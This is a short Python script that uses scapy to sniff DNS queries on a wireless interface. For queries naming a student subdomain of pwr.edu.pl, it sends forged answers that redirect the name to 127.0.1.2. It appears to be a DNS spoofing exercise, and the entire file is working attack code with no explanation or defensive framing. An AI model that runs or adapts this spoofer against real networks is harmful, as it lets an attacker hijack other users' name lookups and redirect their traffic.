#!/usr/bin/python
import scapy.all
from scapy.layers.dns import DNS, send, DNSRR, DNSQR, sniff
from scapy.layers.inet import IP, UDP


def caputre(packet):
    print('working')
    if(DNS in packet and 's.student.pwr.edu.pl.' in str(packet['DNS Question Record'].qname)):
        print('enter')
        pkt = IP(dst=packet[IP].src) / UDP(dport=packet[UDP].sport, sport=53) / DNS(id=packet[DNS].id, ancount=1,
                                                                                  an=DNSRR(rrname=packet[DNSQR].qname,
                                                                                        rdata='127.0.1.2') / DNSRR(
                                                                                      rrname='student.pwr.edu.pl',
                                                                                      rdata='127.0.1.2'))
        send(pkt)

sniff(iface='wlp2s0', prn=caputre, filter='udp and port 53')